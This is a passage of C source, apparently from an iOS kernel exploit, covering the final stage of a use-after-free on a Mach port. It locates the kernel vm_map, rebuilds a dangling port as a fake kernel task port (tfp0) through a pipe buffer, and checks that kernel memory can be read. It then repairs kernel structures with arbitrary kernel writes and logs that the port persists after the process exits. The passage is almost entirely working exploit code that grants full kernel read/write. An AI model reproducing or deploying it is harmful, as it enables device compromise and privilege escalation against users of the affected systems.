            continue;
        }
        uint32_t pid = early_rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
        if (pid != 0) {
            LOG("task isn't the kernel task");
            continue;
        }

        // found the right task, get the vm_map
        kernel_vm_map = early_rk64(task_t + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
        break;
    }

    if (kernel_vm_map == 0) {
        LOG("unable to find the kernel task map");
        return;
    }

    LOG("kernel map:%016llx", kernel_vm_map);

    // find the address of the dangling port:
    uint64_t task_kaddr = early_rk64(task_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = early_rk64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = early_rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));

    const int sizeof_ipc_entry_t = 0x18;
    uint64_t target_port_kaddr = early_rk64(is_table + ((target_port >> 8) * sizeof_ipc_entry_t));

    LOG("dangling port kaddr is: %016llx", target_port_kaddr);

    // now we have everything to build a fake kernel task port for memory r/w:
    // we know which

    int target_port_read_fd = read_ends[replacer_pipe_index];
    int target_port_write_fd = write_ends[replacer_pipe_index];

    uint8_t* fake_tfp0_buf = malloc(0xfff);
    read(target_port_read_fd, fake_tfp0_buf, 0xfff);

    build_fake_task_port(fake_tfp0_buf, target_port_kaddr, 0x4242424243434343, kernel_vm_map, ipc_space_kernel, 0x1234);
    write(target_port_write_fd, fake_tfp0_buf, 0xfff);

    mach_port_t fake_tfp0 = target_port;
    LOG("hopefully prepared a fake tfp0!");

    // test it!
    vm_offset_t data_out = 0;
    mach_msg_type_number_t out_size = 0;
    err = mach_vm_read(fake_tfp0, kernel_vm_map, 0x40, &data_out, &out_size);
    if (err != KERN_SUCCESS) {
        LOG("mach_vm_read failed: %x %s", err, mach_error_string(err));
        return false;
    }

    LOG("kernel read via second tfp0 port worked?");
    LOG("0x%016llx", *(uint64_t*)data_out);
    LOG("0x%016llx", *(uint64_t*)(data_out + 8));
    LOG("0x%016llx", *(uint64_t*)(data_out + 0x10));
    LOG("0x%016llx", *(uint64_t*)(data_out + 0x18));

    prepare_for_rw_with_fake_tfp0(fake_tfp0);

    // can now use {Read,Write}Anywhere_{32,64}

    // cleanup:

    // clean up the fake canary port entry:
    WriteKernel64(is_table + ((fake_canary_port >> 8) * sizeof_ipc_entry_t), 0);
    WriteKernel64(is_table + ((fake_canary_port >> 8) * sizeof_ipc_entry_t) + 8, 0);

    // leak the pipe buffer which replaces the dangling port:

    LOG("going to try to clear up the pipes now");

    // finally we have to fix up the pipe's buffer
    // for this we need to find the process fd table:
    // struct proc:
    uint64_t proc_addr = ReadKernel64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));

    // struct filedesc
    uint64_t filedesc = ReadKernel64(proc_addr + koffset(KSTRUCT_OFFSET_PROC_P_FD));

    // base of ofiles array
    uint64_t ofiles_base = ReadKernel64(filedesc + koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));

    uint64_t ofiles_offset = ofiles_base + (target_port_read_fd * 8);

    // struct fileproc
    uint64_t fileproc = ReadKernel64(ofiles_offset);

    // struct fileglob
    uint64_t fileglob = ReadKernel64(fileproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));

    // struct pipe
    uint64_t pipe = ReadKernel64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));

    // clear the inline struct pipebuf
    LOG("clearing pipebuf: %llx", pipe);
    WriteKernel64(pipe + 0x00, 0);
    WriteKernel64(pipe + 0x08, 0);
    WriteKernel64(pipe + 0x10, 0);

    // do the same for the other end:
    ofiles_offset = ofiles_base + (target_port_write_fd * 8);

    // struct fileproc
    fileproc = ReadKernel64(ofiles_offset);

    // struct fileglob
    fileglob = ReadKernel64(fileproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));

    // struct pipe
    pipe = ReadKernel64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));

    LOG("clearing pipebuf: %llx", pipe);
    WriteKernel64(pipe + 0x00, 0);
    WriteKernel64(pipe + 0x08, 0);
    WriteKernel64(pipe + 0x10, 0);

    for (int i = 0; i < total_fds; i++) {
        close(write_ends[i]);
        close(read_ends[i]);
    }

    LOG("done!");

    LOG("use the functions in kmem.h to read and write kernel memory");
    LOG("tfp0 in there will stay alive once this process exits");
    LOG("keep hold of a send right to it; don't expect this exploit to work again without a reboot");
    return true;
}
